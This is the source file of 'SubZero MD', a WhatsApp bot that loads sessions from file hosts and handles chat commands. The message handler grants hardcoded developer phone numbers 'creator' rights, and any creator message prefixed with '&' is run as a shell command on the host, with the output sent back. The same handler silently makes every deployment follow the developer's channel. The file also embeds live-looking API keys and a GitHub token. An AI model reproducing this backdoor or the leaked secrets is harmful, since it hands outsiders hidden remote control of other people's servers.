

// SUBZERO CREATED BY DARRELL MUCHERI

const axios = require('axios')
const config = require('./config')
    //const { setConfig, getConfig } = require("../lib/configdb");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require(config.BAILEYS)


const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX
const { Octokit } = require('@octokit/rest');
//const axios = require('axios');
const FormData = require('form-data');

// const { commands } = require('./command');
const ownerNumber = ['263719647303']

//=============================================
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
        fs.readdir(tempDir, (err, files) => {
            if (err) throw err;
            for (const file of files) {
                fs.unlink(path.join(tempDir, file), err => {
                    if (err) throw err;
                });
            }
        });
    }
    //=============================================
    // Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//=============================================

const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

/* //===================SESSION-AUTH============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');


// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

// Configuration for different session providers
const tokenSuffix = 'cBxbNViY7tfamYP8W0uyU3Hv7wbxXy3Cikpw'; // Entered at runtime
const SESSION_PROVIDERS = {
    GITHUB: {
        TOKEN: `ghp_${tokenSuffix}`,
        REPO_NAME: 'SUBZERO-SESSIONS',
        REPO_OWNER: 'mrfr8nk' // Replace with your GitHub username
    },
    MONGO: {
        BASE_URL: 'https://subzero-md.koyeb.app',
        API_KEY: 'subzero-md'
    }
};

const octokit = new Octokit({ auth: SESSION_PROVIDERS.GITHUB.TOKEN });

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - please add one!');
            return null;
        }

        console.log('[⏳] Attempting to load session...');

        // GitHub Session Loader
        if (config.SESSION_ID.startsWith('SUBZERO~')) {
            console.log('[🌐] Detected Subzero-DB session storage');
            const fileSha = config.SESSION_ID.replace("SUBZERO~", "");

            try {
                const response = await octokit.repos.getContent({
                    owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
                    repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
                    path: `sessions`,
                    ref: 'main'
                });

                // Find the file with matching SHA
                const file = response.data.find(f => f.sha === fileSha);
                if (!file) {
                    throw new Error('Session file not found in DB');
                }

                console.log(`[🔍] Found session file: ${file.path}`);

                const fileResponse = await octokit.repos.getContent({
                    owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
                    repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
                    path: file.path,
                    ref: 'main'
                });

                const content = Buffer.from(fileResponse.data.content, 'base64').toString('utf8');
                fs.writeFileSync(credsPath, content);
                console.log('[✅] Subzero-DB session downloaded successfully');
                return JSON.parse(content);
            } catch (error) {
                console.error('[❌] GitHub session error:', error.message);
                throw error;
            }
        }
        // Mongo Session Loader
        else if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
            console.log('[🗄️] Detected Mongo session storage');
            try {
                const response = await axios.get(
                    `${SESSION_PROVIDERS.MONGO.BASE_URL}/api/downloadCreds.php/${config.SESSION_ID}`, {
                        headers: { 'x-api-key': SESSION_PROVIDERS.MONGO.API_KEY }
                    }
                );

                if (!response.data.credsData) {
                    throw new Error('No credential data received from Mongo server');
                }

                fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
                console.log('[✅] Mongo session downloaded successfully');
                return response.data.credsData;
            } catch (error) {
                console.error('[❌] Mongo session error:', error.message);
                throw error;
            }
        }
        // MEGA.nz Session Loader
        else {
            console.log('[☁️] Detected MEGA.nz session storage');
            try {
                // Remove "SUBZERO-MD;;;" prefix if present, otherwise use full SESSION_ID
                const megaFileId = config.SESSION_ID.startsWith('SUBZERO-MD;;;') ?
                    config.SESSION_ID.replace("SUBZERO-MD;;;", "") :
                    config.SESSION_ID;

                const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);

                const data = await new Promise((resolve, reject) => {
                    filer.download((err, data) => {
                        if (err) reject(err);
                        else resolve(data);
                    });
                });

                fs.writeFileSync(credsPath, data);
                console.log('[✅] MEGA session downloaded successfully');
                return JSON.parse(data.toString());
            } catch (error) {
                console.error('[❌] MEGA session error:', error.message);
                throw error;
            }
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('⚠️ Will generate QR code instead');
        return null;
    }
} */
/*
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

// Configuration for different session providers
const tokenSuffix = 'cBxbNViY7tfamYP8W0uyU3Hv7wbxXy3Cikpw'; // Entered at runtime
const SESSION_PROVIDERS = {
    GITHUB: {
        TOKEN: `ghp_${tokenSuffix}`,
        REPO_NAME: 'SUBZERO-SESSIONS',
        REPO_OWNER: 'mrfr8nk' // Replace with your GitHub username
    },
    MONGO: {
        BASE_URL: 'https://subzero-md.koyeb.app',
        API_KEY: 'subzero-md'
    }
};

const octokit = new Octokit({ auth: SESSION_PROVIDERS.GITHUB.TOKEN });

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - please add one!');
            return null;
        }

        console.log('[⏳] Attempting to load session...');

        // GitHub Session Loader (new short ID format)
        if (config.SESSION_ID.startsWith('SUBZERO~')) {
            console.log('[🌐] Detected Subzero-DB session storage');
            const sessionId = config.SESSION_ID.replace("SUBZERO~", "");
            
            // New pattern matching for 8-character hex IDs
            if (/^[a-f0-9]{8}$/.test(sessionId)) {
                console.log('[🆔] Detected new short session ID format');
                const fileName = `SUBZERO_${sessionId}.json`;
                
                try {
                    const fileResponse = await octokit.repos.getContent({
                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
                        path: `sessions/${fileName}`,
                        ref: 'main'
                    });

                    const content = Buffer.from(fileResponse.data.content, 'base64').toString('utf8');
                    fs.writeFileSync(credsPath, content);
                    console.log('[✅] Subzero-DB session downloaded successfully (short ID)');
                    return JSON.parse(content);
                } catch (error) {
                    console.error('[❌] GitHub session error (short ID):', error.message);
                    throw error;
                }
            }
            // Legacy SHA format handler
            else {
                console.log('[🆔] Detected legacy SHA session ID format');
                try {
                    const response = await octokit.repos.getContent({
                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
                        path: `sessions`,
                        ref: 'main'
                    });

                    // Find the file with matching SHA
                    const file = response.data.find(f => f.sha === sessionId);
                    if (!file) {
                        throw new Error('Session file not found in DB');
                    }

                    console.log(`[🔍] Found session file: ${file.path}`);

                    const fileResponse = await octokit.repos.getContent({
                        owner: SESSION_PROVIDERS.GITHUB.REPO_OWNER,
                        repo: SESSION_PROVIDERS.GITHUB.REPO_NAME,
                        path: file.path,
                        ref: 'main'
                    });

                    const content = Buffer.from(fileResponse.data.content, 'base64').toString('utf8');
                    fs.writeFileSync(credsPath, content);
                    console.log('[✅] Subzero-DB session downloaded successfully (legacy SHA)');
                    return JSON.parse(content);
                } catch (error) {
                    console.error('[❌] GitHub session error (legacy SHA):', error.message);
                    throw error;
                }
            }
        }
        // Mongo Session Loader
        else if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
            console.log('[🗄️] Detected Mongo session storage');
            try {
                const response = await axios.get(
                    `${SESSION_PROVIDERS.MONGO.BASE_URL}/api/downloadCreds.php/${config.SESSION_ID}`, {
                        headers: { 'x-api-key': SESSION_PROVIDERS.MONGO.API_KEY }
                    }
                );

                if (!response.data.credsData) {
                    throw new Error('No credential data received from Mongo server');
                }

                fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
                console.log('[✅] Mongo session downloaded successfully');
                return response.data.credsData;
            } catch (error) {
                console.error('[❌] Mongo session error:', error.message);
                throw error;
            }
        }
        // MEGA.nz Session Loader
        else {
            console.log('[☁️] Detected MEGA.nz session storage');
            try {
                // Remove "SUBZERO-MD;;;" prefix if present, otherwise use full SESSION_ID
                const megaFileId = config.SESSION_ID.startsWith('SUBZERO-MD;;;') ?
                    config.SESSION_ID.replace("SUBZERO-MD;;;", "") :
                    config.SESSION_ID;

                const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);

                const data = await new Promise((resolve, reject) => {
                    filer.download((err, data) => {
                        if (err) reject(err);
                        else resolve(data);
                    });
                });

                fs.writeFileSync(credsPath, data);
                console.log('[✅] MEGA session downloaded successfully');
                return JSON.parse(data.toString());
            } catch (error) {
                console.error('[❌] MEGA session error:', error.message);
                throw error;
            }
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('⚠️ Will generate QR code instead');
        return null;
    }
}

*/
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');
//const axios = require('axios');

// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

// PixelDrain configuration
const PIXELDRAIN_API_KEY = '15a72bb5-93b4-4452-9166-000bb9aa82d2';
const PIXELDRAIN_API_URL = 'https://pixeldrain.com/api';

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - please add one!');
            return null;
        }

        console.log('[⏳] Attempting to load session...');

        // PixelDrain Session Loader
        if (config.SESSION_ID.startsWith('SUBZERO~')) {
            console.log('[☁️] Detected PixelDrain session storage');
            const fileId = config.SESSION_ID.replace("SUBZERO~", "");

            try {
                // First verify the file exists
                const infoResponse = await axios.get(`${PIXELDRAIN_API_URL}/file/${fileId}/info`, {
                    headers: {
                        'Authorization': `Basic ${Buffer.from(`:${PIXELDRAIN_API_KEY}`).toString('base64')}`
                    }
                });

                if (!infoResponse.data.success) {
                    throw new Error('File not found on PixelDrain');
                }

                // Download the session file
                const downloadResponse = await axios.get(`${PIXELDRAIN_API_URL}/file/${fileId}`, {
                    responseType: 'arraybuffer',
                    headers: {
                        'Authorization': `Basic ${Buffer.from(`:${PIXELDRAIN_API_KEY}`).toString('base64')}`
                    }
                });

                const content = downloadResponse.data.toString('utf8');
                fs.writeFileSync(credsPath, content);
                console.log('[✅] Session downloaded successfully from PixelDrain');

                // Basic validation
                const sessionData = JSON.parse(content);
                if (!sessionData.creds || !sessionData.keys) {
                    throw new Error('Downloaded file is not a valid session');
                }

                return sessionData;
            } catch (error) {
                console.error('[❌] PixelDrain session error:', error.response?.data || error.message);
                throw new Error('Failed to load session from PixelDrain');
            }
        }
        // Mongo Session Loader (fallback)
        else if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
            console.log('[🗄️] Detected Mongo session storage');
            try {
                const response = await axios.get(
                    'https://subzero-md.koyeb.app/api/downloadCreds.php/' + config.SESSION_ID, {
                        headers: { 'x-api-key': 'subzero-md' }
                    }
                );

                if (!response.data.credsData) {
                    throw new Error('No credential data received from Mongo server');
                }

                fs.writeFileSync(credsPath, JSON.stringify(response.data.credsData), 'utf8');
                console.log('[✅] Mongo session downloaded successfully');
                return response.data.credsData;
            } catch (error) {
                console.error('[❌] Mongo session error:', error.message);
                throw error;
            }
        }
        else {
            console.error('❌ Invalid Session ID format');
            return null;
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('⚠️ Will generate QR code instead');
        return null;
    }
}
/*
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

// Create session directory if it doesn't exist
if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

// PixelDrain configuration
const PIXELDRAIN_API_KEY = '15a72bb5-93b4-4452-9166-000bb9aa82d2';
const PIXELDRAIN_API_URL = 'https://pixeldrain.com/api';

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - please add one!');
            return null;
        }

        console.log('[⏳] Attempting to load session...');

        // PixelDrain Session Loader
        if (config.SESSION_ID.startsWith('SUBZERO~')) {
            console.log('[☁️] Detected PixelDrain session storage');
            const fileId = config.SESSION_ID.replace("SUBZERO~", "");

            try {
                const response = await axios.get(`${PIXELDRAIN_API_URL}/file/${fileId}`, {
                    responseType: 'arraybuffer',
                    headers: {
                        'Authorization': `Basic ${Buffer.from(`:${PIXELDRAIN_API_KEY}`).toString('base64')}`
                    }
                });

                const content = response.data.toString('utf8');
                await fs.promises.writeFile(credsPath, content);
                console.log('[✅] Session downloaded successfully from PixelDrain');
                return JSON.parse(content);
            } catch (error) {
                console.error('[❌] PixelDrain session error:', error.message);
                throw error;
            }
        }
        // Mongo Session Loader (kept for compatibility)
        else if (config.SESSION_ID.startsWith('SUBZERO-MD~')) {
            console.log('[🗄️] Detected Mongo session storage');
            try {
                const response = await axios.get(
                    'https://subzero-md.koyeb.app/api/downloadCreds.php/' + config.SESSION_ID, {
                        headers: { 'x-api-key': 'subzero-md' }
                    }
                );

                if (!response.data.credsData) {
                    throw new Error('No credential data received from Mongo server');
                }

                await fs.promises.writeFile(credsPath, JSON.stringify(response.data.credsData), 'utf8');
                console.log('[✅] Mongo session downloaded successfully');
                return response.data.credsData;
            } catch (error) {
                console.error('[❌] Mongo session error:', error.message);
                throw error;
            }
        }
        else {
            console.error('❌ Invalid Session ID format');
            return null;
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('⚠️ Will generate QR code instead');
        return null;
    }
}

//=========SESSION-UPLOAD=====================
async function uploadSession(credsPath) {
    try {
        if (!fs.existsSync(credsPath)) {
            throw new Error('Session file not found');
        }

        const formData = new FormData();
        formData.append('file', fs.createReadStream(credsPath), 'session.json');

        const response = await axios.post(`${PIXELDRAIN_API_URL}/file`, formData, {
            headers: {
                'Authorization': `Basic ${Buffer.from(`:${PIXELDRAIN_API_KEY}`).toString('base64')}`,
                ...formData.getHeaders()
            }
        });

        if (!response.data.success) {
            throw new Error('Upload failed');
        }

        return `SUBZERO~${response.data.id}`;
    } catch (error) {
        console.error('Upload error:', error);
        throw error;
    }
}
*/
//=========SESSION-AUTH=====================





async function connectToWA() {
    console.log("[❄️] Connecting to WhatsApp ⏳️...");

    // Load session if available (now handles both Koyeb and MEGA)
    const creds = await loadSession();

    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
        creds: creds || undefined // Pass loaded creds if available
    });

    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false, // Only show QR if no session loaded
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        getMessage: async() => ({})
    });

    // ... rest of your existing connectToWA code ...


    conn.ev.on('connection.update', async(update) => {
        const { connection, lastDisconnect, qr } = update;

        if (connection === 'close') {
            if (lastDisconnect.error ?.output ?.statusCode !== DisconnectReason.loggedOut) {
                console.log('[❄️] Connection lost, reconnecting...');
                setTimeout(connectToWA, 5000);
            } else {
                console.log('[❄️] Connection closed, please change session ID');
            }
        } else if (connection === 'open') {
            console.log('[❄️] SubZero MD Connected ✅');


            // Load plugins
            const pluginPath = path.join(__dirname, 'plugins');
            fs.readdirSync(pluginPath).forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() === ".js") {
                    require(path.join(pluginPath, plugin));
                }
            });
            console.log('[❄️] Plugins installed successfully ✅');


            // Send connection message

            try {
                // const username = config.REPO.split('/').slice(3, 4)[0];
                const botname = "𝐒𝐔𝐁𝐙𝐄𝐑𝐎 𝐌𝐃"; //add your name
                const ownername = "𝐌𝐑 𝐅𝐑𝐀𝐍𝐊"; // add your name
                const subzero = {
                    key: {
                        remoteJid: 'status@broadcast',
                        participant: '0@s.whatsapp.net'
                    },
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '120363304325601080@newsletter', //add your channel jid
                            newsletterName: "𝐈𝐂𝐘 𝐁𝐎𝐓", //add your bot name
                            caption: botname + ` 𝐁𝐘 ` + ownername,
                            inviteExpiration: 0
                        }
                    }
                }



                const username = `mrfr8nk`;
                const mrfrank = `https://github.com/${username}`;

                const upMessage = `\`SubZero Bot Connected!\` ✅
\n\n> _Light, Cold, Icy, Fast & Rich Loaded With Features, SubZero W.A Bot._\n\n────────────────
> 🌟 \`Star Repo\` : 
${config.REPO}\n
> 🎀 \`Follow Us\` :
${mrfrank}\n
> ⛔  \`Bot Prefix\` ${prefix}
────────────────
\n> © ᴘϙᴡᴇʀᴇᴅ ʙʏ ᴍʀ ꜰʀᴀɴᴋ ᴏꜰᴄ  🎐`;

               await conn.sendMessage(conn.user.id, { 
                        image: { url: `https://i.postimg.cc/Kv6gLVvq/In-Shot-20250528-234036372.jpg` },
			ai: true,
                        caption: upMessage
			
                    });
                
                /*
            //  DOESN'T SUPOORT IOS
            
              await conn.sendMessage(conn.user.id, {
                    image: { url: `https://i.postimg.cc/Kv6gLVvq/In-Shot-20250528-234036372.jpg` },
                    ai: true,
                    caption: upMessage
                }, {
                    quoted: subzero
                }); */

                // Send settings menu after connection message
                const cmdList = ` ----------------------------------------
    \`\`\`SUBZERO BOT SETTINGS\`\`\`
    -----------------------------------------
    
🔧 *1. \`Mode\`*
   - Current Status: ${config.MODE || "public"}
   - Usage: ${config.PREFIX}mode private/public

🎯 *2. \`Auto Typing\`*
   - Current Status: ${config.AUTO_TYPING || "off"}
   - Usage: ${config.PREFIX}autotyping on/off

🌐 *3. \`Always Online\`*
   - Current Status: ${config.ALWAYS_ONLINE || "off"}
   - Usage: ${config.PREFIX}alwaysonline on/off

🎙️ *4. \`Auto Recording\`*
   - Current Status: ${config.AUTO_RECORDING || "off"}
   - Usage: ${config.PREFIX}autorecording on/off

📖 *5. \`Auto React Status\`*
   - Current Status: ${config.AUTO_STATUS_REACT || "off"}
   - Usage: ${config.PREFIX}autostatusreact on/off

👀 *#. \`Auto View Status\`*
   - Current Status: ${config.AUTO_STATUS_SEEN|| "off"}
   - Usage: ${config.PREFIX}autoviewstatus on/off

🚫 *6. \`Anti Bad Word\`*
   - Current Status: ${config.ANTI_BAD_WORD || "off"}
   - Usage: ${config.PREFIX}antibad on/off

🗑️ *7. \`Anti Delete\`*
   - Current Status: ${config.ANTI_DELETE || "off"}
   - Usage: ${config.PREFIX}antidelete on/off

🖼️ *8. \`Auto Sticker\`*
   - Current Status: ${config.AUTO_STICKER || "off"}
   - Usage: ${config.PREFIX}autosticker on/off

💬 *9. \`Auto Reply\`*
   - Current Status: ${config.AUTO_REPLY || "off"}
   - Usage: ${config.PREFIX}autoreply on/off

❤️ *10. \`Auto React\`*
   - Current Status: ${config.AUTO_REACT || "off"}
   - Usage: ${config.PREFIX}autoreact on/off

📢 *11. \`Status Reply\`*
   - Current Status: ${config.AUTO_STATUS_REPLY || "off"}
   - Usage: ${config.PREFIX}autostatusreply on/off

🔗 *12. \`Anti Link\`*
   - Current Status: ${config.ANTI_LINK || "off"}
   - Usage: ${config.PREFIX}antilink on/off

🤖 *13. \`Anti Bot\`*
   - Current Status: ${config.ANTI_BOT || "off"}
   - Usage: ${config.PREFIX}antibot off/warn/delete/kick


📞 *•. \`Anti Call\`*
   - Current Status: ${config.ANTI_CALL || "off"}
   - Usage: ${config.PREFIX}anticall off/on

💖 *14. \`Heart React\`*
   - Current Status: ${config.HEART_REACT || "off"}
   - Usage: ${config.PREFIX}heartreact on/off

🔧 *15. \`Set Prefix\`*
   - Current Prefix: ${config.PREFIX || "."}
   - Usage: ${config.PREFIX}setprefix <new_prefix>
   
 🤖 *16. \`Set Bot Name\`*
   - Current Bot Name' ${config.BOT_NAME || "SUBZERO MD"}
   - Usage: ${config.PREFIX}setbotname <new_name>
   
 🤴 *17. \`Set Owner Name\`*
   - Current Owner Name: ${config.OWNER_NAME || "DEE"}
   - Usage: ${config.PREFIX}setownername <owner_name> 
   
🖼️ *18. \`Set Bot Image\`*
   - Current Bot Image: ${config.BOT_IMAGE || "DEFAULT IMAGE"}
   - Usage: ${config.PREFIX}setbotimage <image_url> / reply to photo

🔄 *19. \`Auto Bio\`*
   - Current Status: ${config.AUTO_BIO || "off"}
   - Usage: ${config.PREFIX}autobio on/off [custom text]

🫂 *20. \`SEND WELCOME & GOODBYE MSG\`*
   - Current Status: ${config.WELCOME_GOODBYE || "off"}
   - Usage: ${config.PREFIX}welcome on/off 

 🤖 *21. \`AI Chatbot\`*
   - Current Status:  off
   - Usage: ${config.PREFIX}chatbot on/off

📌 *Note*: Replace \`"on/off"\` with the desired state to enable or disable a feature.
                    `;

                await conn.sendMessage(conn.user.id, {
                  /* 
                  // IOS ERROR TOO
                  image: { url: 'https://files.catbox.moe/703kuc.jpg' },
                    ai: true,
                    caption: cmdList
                }, {
                    quoted: subzero

                }); */

                 image: { url: 'https://files.catbox.moe/703kuc.jpg' },
                        ai: true,
			caption: cmdList
			 
                    });

            

            } catch (sendError) {
                console.error('[❄️] Error sending messages:', sendError);
            }
        }

        if (qr) {
            console.log('[❄️] Scan the QR code to connect or use session ID');
        }
    });

    conn.ev.on('creds.update', saveCreds);




    // =====================================

    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected:", JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });
    //=========WELCOME & GOODBYE =======

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));


    /// READ STATUS       
    conn.ev.on('messages.upsert', async(mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ?
            mek.message.ephemeralMessage.message :
            mek.message;
            //================== C FOLLOW ==================

            const metadata = await conn.newsletterMetadata("jid", "120363304325601080@newsletter");
       if (metadata.viewer_metadata === null) {
            await conn.newsletterFollow("120363304325601080@newsletter");
            console.log("SUBZERO MD CHANNEL FOLLOW ✅");
        }


           //================== BODY ==============



        
        //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]); // Mark message as read
            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }
        if (mek.message.viewOnceMessageV2)
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
            await conn.readMessages([mek.key])



            //================== AUTO REACT ==============
const newsletterJids = [
    "120363304325601080@newsletter"
];
const emojis = ["❤️", "🔥", "😯"];

if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
    try {
        const serverId = mek.newsletterServerId;
        if (serverId) {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
            console.log("Reacted to channel message with", emoji);
        }
    } catch (e) {
        console.error("Error reacting to channel message:", e);
    }
}
        }

            
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
            const jawadlike = await conn.decodeJid(conn.user.id);
            const emojis = ['❤️', '🌹', '😇', '❄️', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🇿🇼', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '✨', '🇿🇼', '💜', '💙', '🌝', '🖤', '💚'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.sendMessage(mek.key.remoteJid, {
                react: {
                    text: randomEmoji,
                    key: mek.key,
                }
            }, { statusJidList: [mek.key.participant, jawadlike] });
        }
        if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
            const user = mek.key.participant
            const text = `${config.AUTO_STATUS_MSG}`
            await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
        }
        await Promise.all([
            saveMessage(mek),
        ]);


        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        const isCmd = body.startsWith(prefix)
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek })
        }


        const udp = botNumber.split('@')[0];
        const darex = ('263719647303', '263719064805', '263788236690');

        const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));

        let isCreator = [udp, ...darex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
            .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
            .includes(mek.sender);


        if (isCreator && mek.text.startsWith("&")) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            const { spawn } = require("child_process");
            try {
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                });
                resultTest.stderr.on("data", data => {
                    reply(data.toString());
                });
                resultTest.on("error", data => {
                    reply(data.toString());
                });
                resultTest.on("close", code => {
                    if (code !== 0) {
                        reply(`command exited with code ${code}`);
                    }
                });
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        //=========BAN SUDO=============
        // --- Ban and Sudo Utility Code for index.js ---

        //=============DEV REACT==============

        if (senderNumber.includes("263719064805")) {
            if (isReact) return
            m.react("🫟")
        }
        /*if (senderNumber.includes(config.DEV)) {
          ireturn m.react("🫟");
        }
        	  
        */
        //==========public react============//
        // Auto React 
        if (!isReact && senderNumber !== botNumber) {
            if (config.AUTO_REACT === 'true') {
